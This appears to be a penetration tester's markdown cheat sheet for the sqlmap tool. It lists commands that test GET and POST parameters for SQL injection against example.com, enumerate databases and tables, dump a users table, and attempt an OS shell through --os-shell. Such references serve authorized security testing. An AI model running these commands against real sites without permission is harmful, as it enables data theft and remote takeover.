---
tags:
  - tool
  - web
  - sql
  - injection
---
# sqlmap

Automatically test SQL injection

## Capabilities

```powershell
# See extended options
sqlmap -hh

# Test a GET request
sqlmap -u https://example.com?sqli_param=a --batch --level 2
sqlmap -u https://example.com?sqli_param=a --dbs
sqlmap -u https://example.com?sqli_param=a -D example_database --tables
sqlmap -u https://example.com?sqli_param=a -D example_database -T example_users --dump

# Test a POST request with cookie
sqlmap -u https://example.com --cookie 'key=value' --data 'safe_param=safe_value&sqli_param=a' -p $PARAM --batch --level 2
sqlmap -u https://example.com --cookie 'key=value' --data 'safe_param=safe_value&sqli_param=a' -p $PARAM --dbs
sqlmap -u https://example.com --cookie 'key=value' --data 'safe_param=safe_value&sqli_param=a' -p $PARAM -D example_database --tables
sqlmap -u https://example.com --cookie 'key=value' --data 'safe_param=safe_value&sqli_param=a' -p $PARAM -D example_database -T example_users --dump

# Specify dbms if known from source code
sqlmap -u https://example.com --cookie 'key=value' --data 'safe_param=safe_value&sqli_param=a' -p $PARAM --batch --level 2 --dbms=SQLite

# Test a request copied from burp
sqlmap -r post.req -p $PARAM --batch

# Attempt to pop a shell
sqlmap -u https://example.com?sqli_param=a --os-shell

# Attempt to pop a shell specifying the web root directory (must be writeable)
sqlmap -u https://example.com?sqli_param=a --os-shell --web-root '/var/www/html'

# Increase level if necessary (up to level 5)
sqlmap -r post.req -p $PARAM --batch --level 2
```
